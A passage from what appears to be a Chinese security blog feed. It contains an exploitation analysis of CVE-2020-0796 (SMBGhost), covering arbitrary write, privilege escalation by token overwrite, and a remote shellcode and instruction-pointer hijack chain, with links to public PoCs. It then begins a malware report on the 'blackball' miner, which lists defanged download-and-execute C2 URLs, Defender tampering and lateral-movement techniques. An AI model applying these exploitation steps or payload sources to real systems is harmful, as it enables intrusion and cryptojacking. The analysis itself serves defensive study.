SrvNetBufferLookasides[LookasideListIndex];</span><br><span class="line">        Result = <span class="comment">/* fetch result from list */</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Initialize some Result fields...</span></span><br><span class="line">    <span class="keyword">return</span> Result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中值得关注的是后备列表，是Windows内核提供的一种机制，用于有效地为驱动程序保留一组可重用的固定大小的缓冲区。由于每次调ExAllocatePoolWithTag和ExFreePoolWithTag都花费大量时间，因此内核驱动程序通常会为其自身的数据结构提供一个后备列表，当后备列表数据结构初始化完成时，后续从列表中检索元素时就无需再次初始化了，以提高效率。这表明我们可以破坏表头，将其添加到列表中，然后在以后的请求中从列表中检索复用，从而达到漏洞利用的目的。</p><p>函数SrvNetAllocateBuffer这里用到的后备列表SrvNetBufferLookasides也是如此，在函数SrvNetCreateBufferLookasides初始化之后，便可以从列表中检索元素复用，并且在初始化也同样是调用SrvNetAllocateBufferFromPool来开辟空间的只不过后备列表是提前开辟好的固定大小。SrvNetAllocateBuffer函数这里提供了9个后备列表，其中大小分别为：[0x1100,0x2100,0x4100,0x8100,0x10100,0x20100,0x40100,0x80100,0x100100]。</p><p>SrvNetAllocateBuffer最终都是通过调用SrvNetAllocateBufferFromPool来开辟空间的，但该函数返回的并不是指向开辟缓冲区的指针，而是SRVNET_BUFFER_HDR结构体，开辟的缓冲区就位于该结构体上方。这种布局为后续溢出提供了可能。布局可见上面Srv2DecompressData处理的示意图。SRVNET_BUFFER_HDR结构信息如图：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">declspec</span>(<span class="title">align</span>(8)) <span class="title">SRVNET_BUFFER_HDR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  LIST_ENTRY List;      </span><br><span class="line">  USHORT Flag;          </span><br><span class="line">  BYTE unknown0[<span class="number">4</span>];     </span><br><span class="line">  WORD unknown1;        </span><br><span class="line">  PBYTE pNetRawBuffer; <span class="comment">//point to userbuffer </span></span><br><span class="line">  DWORD dwNetRawBufferSize;</span><br><span class="line">  DWORD dwMsgSize;</span><br><span class="line">  DWORD dwNonPagedPoolSize;</span><br><span class="line">  DWORD dwPadding;</span><br><span class="line">  PVOID pNonPagedPoolAddr;</span><br><span class="line">  PMDL pMDL1; <span class="comment">// points to mdl1</span></span><br><span class="line">  DWORD dwByteProcessed;</span><br><span class="line">  BYTE unknown2[<span class="number">4</span>];</span><br><span class="line">  _QWORD unknown3;</span><br><span class="line">  PMDL pMDL2; <span class="comment">// points to mdl2</span></span><br><span class="line">  PSRVNET_RECV pSrvNetWskStruct;</span><br><span class="line">  DWORD unknown4;</span><br><span class="line">  <span class="keyword">char</span> unknown5[<span class="number">12</span>];</span><br><span class="line">  <span class="keyword">char</span> unknown6[<span class="number">32</span>];</span><br><span class="line">  MDL mdl1; <span class="comment">// variable size</span></span><br><span class="line">  <span class="keyword">char</span> unknow7[<span class="number">24</span>];</span><br><span class="line">  MDL mdl2; <span class="comment">// variable size</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="解压缩数据"><a href="#解压缩数据" class="headerlink" title="解压缩数据"></a>解压缩数据</h3><p>在代码B处SmbCompressionDecompress函数解压缩收到的压缩数据。解压后的Decompress Data数据被放到AllocHeader-&gt;UserBuffer+Offset(OriginalCompressedSegmentSize的值不影响函数的运行结果)。由于在A处的整型溢出开辟了0x1100（后备列表中的最小值）的缓冲区空间，因此只要构造Offset Data + Decompress Data大于0x1100的数据就能覆盖紧跟在缓冲区后面的AllocHeader结构。被覆盖的AllocHeader结构中有两个值需要关注，后面漏洞利用会用上。</p><ul><li><p>偏移为0x18的AllocHeader-&gt;UserBuffer,指向存放Offset Data + Decompress Data的缓存区。</p></li><li><p>偏移为0x38的AllocHeader-&gt;PMDL1,指向MDL1结构。</p></li></ul><h3 id="拷贝Offset-Data数据"><a href="#拷贝Offset-Data数据" class="headerlink" title="拷贝Offset Data数据"></a>拷贝Offset Data数据</h3><p>在代码C处memcpy函数将压缩数据包中的Offset Data拷贝到AllocHeader-&gt;UserBuffer中（解压缩数据之前）。不过在B处执行SmbCompressionDecompress时存在缓冲区溢出的可能，如果将AllocHeader-&gt;UserBuffer的值覆盖为指定地址，并且Offset Data数据和大小，以及Decompress Data（未压缩的数据）的值也都是我们可以控制的。因此就可以实现任意内存写操作了。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/02_SMBv3_RCE_POC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E6%8B%B7%E8%B4%9DOffsetData%E6%95%B0%E6%8D%AE.png" alt="拷贝OffsetData数据"></p><h1 id="漏洞利用分析"><a href="#漏洞利用分析" class="headerlink" title="漏洞利用分析"></a>漏洞利用分析</h1><h2 id="本地权限提升"><a href="#本地权限提升" class="headerlink" title="本地权限提升"></a>本地权限提升</h2><p>本地提权（Exp）利用前面所描述的任意内存写操作修改SEP_TOKEN_PRIVILEGES结构中的关键数据来提升自身权限。首先提权程序先获取自身token，通过0x40偏移取得SEP_TOKEN_PRIVILEGES结构的首地址XXXX,结构如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/02_SMBv3_RCE_POC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/SEP_TOKEN_PRIVILEGES.png" alt="SEP_TOKEN_PRIVILEGES"></p><p>SEP_TOKEN_PRIVILEGES结构中包含与令牌相关的特权信息。其中Present为令牌当前可用权限；Enable为已启用的权限；EnabledByDefault为默认情况下已启用的权限。它们都采用8字节数据来存储特权的flag，从低位起每一个bit位代表一个指定的特权。结构如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/02_SMBv3_RCE_POC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/EnabledByDefault.png" alt="EnabledByDefault"></p><p>然后通过该漏洞精准覆盖AllocHeader-&gt;UserBuffer地址为XXXX，将Offset Data的值设置为两个0x1ff2ffffbc（system进程中的Present为此值），分别用于覆盖当前进程的Present和Enable值，从而实现权限提升。</p><h2 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h2><p>远程代码执行相对于本地权限提升就要复杂的多。当想要实现远程代码执行需要两个条件，一个条件是远程主机内存中写shellcode，另一个条件是控制指令指针寄存器指向这段shellcode中去执行。</p><h3 id="远程写shellcode"><a href="#远程写shellcode" class="headerlink" title="远程写shellcode"></a>远程写shellcode</h3><p>往远程主机内存中写shellcode，根据之前分析的任意内存写操作已经可以实现了，只需要将内核态的shellcode和用户态的shellcode写入KUSER_SHARED_DATA中，这是一个在用户域和内核域中映射的结构（和页面）。它的地址是0x7ffe0000和0xfffff78000000000，在用户域和内核域分别设置为r–和rw-。</p><h3 id="控制指令指针寄存器"><a href="#控制指令指针寄存器" class="headerlink" title="控制指令指针寄存器"></a>控制指令指针寄存器</h3><p>要想控制指令指针寄存器，首先需要实现任意内存读取操作。</p><h4 id="任意内存读取"><a href="#任意内存读取" class="headerlink" title="任意内存读取"></a>任意内存读取</h4><p>由于我们通过溢出覆盖AllocHeader-&gt;UserBuffer来实现任意内存写操作，是通过请求数据包来实现的，服务器将保持沉默或最多返回正常相应不会立即提供任何信息。幸运的是srv2.sys提供了一个可以利用的函数srv2!Srv2SetResonseBufferToReceiveBuffer:</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/02_SMBv3_RCE_POC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/srv2!Srv2SetResonseBufferToReceiveBuffer.png" alt="srv2!Srv2SetResonseBufferToReceiveBuffer"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">declspec</span>(<span class="title">align</span>(16)) <span class="title">SRV2_WORKITEM</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">  ...</span><br><span class="line">  PSRVNET_BUFFER_HDR psbhRequest; <span class="comment">// offset +0xf0</span></span><br><span class="line">  PSRVNET_BUFFER_HDR psbhResponse; <span class="comment">// offset +0xf8</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">Srv2SetResponseBufferToReceiveBuffer</span><span class="params">(SRV2_WORKITEM *workitem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  workitem-&gt;psbhResponse = workitem-&gt;psbhRequest;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>请求和响应在有效负载中共享许多公共部分，使用此功能能有效地重用缓冲区，因此提供了利用的可能。正如srv2!Srv2SetResponseBufferToReceiveBuffer函数在准备响应缓冲区时，不会再次初始化缓冲区（SRVNET_BUFFER_HDR）。因此我们只需要调用此函数，便能通过控制请求缓冲来实现控制响应缓冲区。</p><h5 id="伪造MDL"><a href="#伪造MDL" class="headerlink" title="伪造MDL"></a>伪造MDL</h5><p>现在可以控制响应缓冲区（SRVNET_BUFFER_HDR）了，剩下便是如何控制要读取的内容了。由于tcpip.sys最终依赖DMA(Direct Memory Access直接内存访问)来传输数据包的，因此驱动程序会维护MDL中缓冲区的物理地址。MDL结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">  QWORD            _MDL;      </span><br><span class="line">  USHORT           Size;</span><br><span class="line">  USHORT           MdlFlags;</span><br><span class="line">  USHORT           AllocationProcessorNumber;</span><br><span class="line">  USHORT           Reserved;</span><br><span class="line">  QWORD            Process;</span><br><span class="line">  QWORD            MappedSystemVa;</span><br><span class="line">  QWORD            StartVa;</span><br><span class="line">  ULONG            ByteCount;</span><br><span class="line">  ULONG            ByteOffset;</span><br><span class="line">  <span class="comment">// Actually physical addresses follow. </span></span><br><span class="line">  <span class="comment">// Therefore, the size of this struct is variable</span></span><br><span class="line">&#125; MDL, PMDL;</span><br></pre></td></tr></table></figure><p>POC中伪造的MDL如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/02_SMBv3_RCE_POC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/POCFakeMDL.png" alt="POCFakeMDL"></p><p>在SRVNET_BUFFER_HDR中，PMDL1和PMDL2是执行MDL结构的指针，这些结构描述了包含tcpip.sys发送给客户端的数据内存。因此我们可以通过任意内存写，先将构造好的伪造的MDL写到KUSER_SHARED_DATA中，然后在通过溢出覆盖PMDL1指针，使其指向写入KUSER_SHARED_DATA中伪造的MDL，再通过触发函数Srv2SetResponseBufferToReceiveBuffer复用此SRVNET_BUFFER_HDR缓冲区结构，就能通过构造不同的MDL来实现从服务端任意物理内存读取数据的操作，示意图如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/02_SMBv3_RCE_POC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%86%99%E5%85%A5MDL%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="写入MDL示意图"></p><p>覆盖PMDL1以及触发函数Srv2SetResponseBufferToReceiveBuffer细节</p><p>如果我们像之前那样在B处直接覆盖AllocHeader-&gt;PMDL1势必会覆盖到PNonPagePoolAddr，给PNonPagePoolAddr一个无效的值，迟早会在srvnet!SrvNetFreeBuffer中产生崩溃。因此可以通过将Offset Data的大小设置为AllocHeader-&gt;PMDL1相对于AllocHeader-&gt;UserBuffer的偏移。这样在B处进行解压缩时便是从 AllocHeader-&gt;UserBuffer+Offset = AllocHeader-&gt;PMDL1处开始的，这样就可以在B处不影响PNonPagePoolAddr的值来实现覆盖AllocHeader-&gt;PMDL1</p><p>。不过这样在C处拷贝Offset Data时依旧会覆盖PNonPagePoolAddr导致崩溃，因此选择在B处构造错误的LZNT1（压缩格式）数据包。在B处解压错误的LZNT1数据包时，依旧能够覆盖PMDL，并直到解压缩到损坏模块为止，然后在发送请求数据包来触发Srv2SetResponseBufferToReceiveBuffer来实现任意物理内存读取（<font color = red><b>这里调试没有完全跟到是如何读取的物理内存地址数据的</b></font>）。</p><h3 id="构造并执行ShellCode"><a href="#构造并执行ShellCode" class="headerlink" title="构造并执行ShellCode"></a>构造并执行ShellCode</h3><p><font color=red><b>下面的内容由于时间有限能力有限，对如何从内存地址中找到指令指针寄存器不是很清楚。根据自己的理解简单的描述了一下。</b></font></p><p>有了任意物理内存读，然后通过在物理页面暴力搜索找到HAL的堆地址，然后从HAL的堆地址中找到HalpInterruptController和HalpApicRequestInterrupt两个值来构造内核态的Shellcode，。如图（其中HALP_APIC_REQ_INTERRUPT_OFFSET的值是写死的0x78）：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/02_SMBv3_RCE_POC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/Build_ShellCode.png" alt="Build_ShellCode"></p><p>然后再通过任意内存写操作将构造好的ShellCode写到KUSER_SHARED_DATA地址上。最终通过任意内存写操作将指令指针（PHALP_INTERRUPT + HALP_APIC_REQ_INTERRUPT_OFFSET）指向KUSER_SHARED_DATA地址上的ShellCode去执行。写Shellcode和修改EIP操作如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/02_SMBv3_RCE_POC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E4%BF%AE%E6%94%B9EIP%E6%93%8D%E4%BD%9C.png" alt="修改EIP操作"></p><p>远程代码执行读写操作逻辑，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/02_SMBv3_RCE_POC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C%E9%80%BB%E8%BE%91.png" alt="远程代码执行读写操作逻辑"></p><h1 id="CVE-2020-0796-相关参考文档"><a href="#CVE-2020-0796-相关参考文档" class="headerlink" title="CVE-2020-0796 相关参考文档"></a>CVE-2020-0796 相关参考文档</h1><p><strong>SMB v3远程代码执行POC：</strong></p><p><a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p><p><strong>SMB v3 本地提权POC：</strong></p><p><a href="https://github.com/danigargu/CVE-2020-0796">https://github.com/danigargu/CVE-2020-0796</a></p><p><strong>相关分析文档：</strong></p><p><a href="https://mp.weixin.qq.com/s/rKJdP_mZkaipQ9m0Qn9_2Q">https://mp.weixin.qq.com/s/rKJdP_mZkaipQ9m0Qn9_2Q</a></p><p><a href="https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/">https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/</a></p><p><a href="https://ricercasecurity.blogspot.com/2020/04/ill-ask-your-body-smbghost-pre-auth-rce.html">https://ricercasecurity.blogspot.com/2020/04/ill-ask-your-body-smbghost-pre-auth-rce.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> 漏洞分析 </tag>
            
            <tag> SMBGhost </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>永恒之蓝下载器blackball分析报告</title>
      <link href="2020/05/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
      <url>2020/05/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<center><font size = 6><b>永恒之蓝下载器blackball分析报告</b></font></center><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>在为客户进行远程排查时，提取到名为blackball的Powershell恶意挖矿程序，经分析关联到一个长期活跃的样本家族，最早出现于2018年。此次的样本较历史版本增加了SMBv3漏洞扫描等模块（便于后续版本漏洞利用），为该家族的最新变种。</p></blockquote><h1 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h1><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A//%E6%B5%81%E7%A8%8B%E5%9B%BE.png" alt="流程图"></p><p>根据从感染主机上抓取到的PowerShell的命令行参数来着手分析，该命令行参数是从http[:]//t.tr2q.com/x.js下载执行x.js。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/x.js.png" alt="x.js"></p><p>下载到的x.js是经过多轮解混淆操作的PowerShell代码，其主要功能为通过WMI来收集主机信息并将收集到的数据上传至服务器，再从http[:]//t.tr2q.com/x.jsp下载执行x.jsp，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/x.jsp.png" alt="x.jsp"></p><p>主要收集的信息有：</p><table><thead><tr><th>主机名</th><th>GUID</th></tr></thead><tbody><tr><td><strong>MAC地址</strong></td><td><strong>操作系统版本</strong></td></tr><tr><td><strong>操作系统位数</strong></td><td><strong>时间</strong></td></tr></tbody></table><h1 id="恶意样本主体框架"><a href="#恶意样本主体框架" class="headerlink" title="恶意样本主体框架"></a>恶意样本主体框架</h1><p>从服务器上下载下来的x.jsp文件便是该恶意样本的主体框架，主要行为包含：</p><ul><li>收集操作系统信息</li><li>执行挖矿</li><li>横向传播</li><li>创建计划任务实现持久化</li><li>构造钓鱼邮件实施传播</li></ul><h2 id="收集操作系统信息"><a href="#收集操作系统信息" class="headerlink" title="收集操作系统信息"></a>收集操作系统信息</h2><p>通过WMI再次收集大量操作系统信息，PowerShell代码如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/WMI.png" alt="WMI"></p><p>收集的信息有：</p><table><thead><tr><th>主机名</th><th>UUID</th></tr></thead><tbody><tr><td><strong>MAC地址</strong></td><td><strong>操作系统版本</strong></td></tr><tr><td><strong>用户名</strong></td><td><strong>域信息</strong></td></tr><tr><td><strong>时间信息</strong></td><td><strong>显卡信息</strong></td></tr><tr><td><strong>内存大小</strong></td><td><strong>盘符信息</strong></td></tr></tbody></table><p>修改Defender配置，关闭实时监控；添加排除目录C:\；添加排除进程PowerShell进程。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/defender-1600785906470.png" alt="defender"></p><p>设置DNS服务器；并将获取到的信息拼接起来，后续当有下载访问时再将拼接好的信息发送至服务器，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/DNS.png" alt="DNS"></p><p>创建感染标记文件GkPiGedjuq8f91j.txt，并设置65529和65533端口转发，其中65529端口在后续横向传播时，作为感染标记。</p><p>同时关闭445端口和135端口防止后续其他挖矿程序入侵。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A//445_135.png" alt="445_135"></p><h2 id="执行挖矿"><a href="#执行挖矿" class="headerlink" title="执行挖矿"></a>执行挖矿</h2><p>首先，根据之前获取到的显卡信息，来判断感染主机的显卡类型，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A//%E6%98%BE%E5%8D%A1.png" alt="显卡"></p><p>然后再根据经过判断的显卡类型，以及操作系统版本来下载执行不同的挖矿程序。</p><p>具体代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/coinminer.png" alt="coinminer"></p><p>当为64位操作系统时，会从http[:]//d.ackng.com下载名为m6.bin的XMRig的CPU挖矿程序；</p><p>当含有英伟达或是AMD的显卡并且为64位操作系统时，会从http[:]//d.ackng.com下载m6g.bin的XMRig的GPU挖矿程序。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/GPU.png" alt="GPU"></p><p>并且当感染主机的显卡为英伟达的显卡时，且操作系统版本为64位，会再下载XMRig CUDA插件来辅助挖矿。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/XMRig.png" alt="XMRig"></p><p>通过动态加载的方式执行矿机主体程序，实现无文件挖矿。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/nofile.png" alt="nofile"></p><h2 id="横向传播"><a href="#横向传播" class="headerlink" title="横向传播"></a>横向传播</h2><p>通过另起cmd进程，调用PowerShell执行构造好的指令，从http[:]//d.ackng.com下载执行if.bin文件，执行的PowerShell指令代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/if.bin.png" alt="if.bin"></p><p>If.bin主要是进行横向传播的，其行为有：</p><ul><li>感染可移动存储设备和网络驱动器</li><li>清理其他挖矿程序</li><li>使用PowerDump和Mimikatz获取感染主机的用户名密码</li><li>SMB爆破</li><li>永恒之蓝及SMBv3漏洞利用</li><li>MS-SQL Server 管理员账户暴力破解</li></ul><h3 id="感染可移动存储设备和网络驱动器"><a href="#感染可移动存储设备和网络驱动器" class="headerlink" title="感染可移动存储设备和网络驱动器"></a>感染可移动存储设备和网络驱动器</h3><p>另起PowerShell进程执行感染可移动设备的C#代码，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/removefile.png" alt="removefile"></p><p>感染USB等可移动设备和网络驱动器，写入带有CVE-2017-8464漏洞的link文件，一旦其他主机点击（不需要打开.lnk文件）被感染后的可移动存储设备或网络驱动器，便会触发CVE-2017-8464漏洞导致远程代码执行，进而感染病毒。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/infected.png" alt="infected"></p><p>.lnk文件的内容如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/15_%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%B8%8B%E8%BD%BD%E5%99%A8blcakball%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/lnk.jpg" alt="lnk"></p><h3 id="清理其他挖矿程序"><a href="#清理其他挖矿程序" class="headerlink" title="清理其他挖矿程序"></a>清理其他挖矿程序</h3><p>清理操作主要为：关闭服务，删除计划任务，清除其他挖矿程序另起PowerShell进程执行Source4的PowerShell指令，如图：</p><p><img 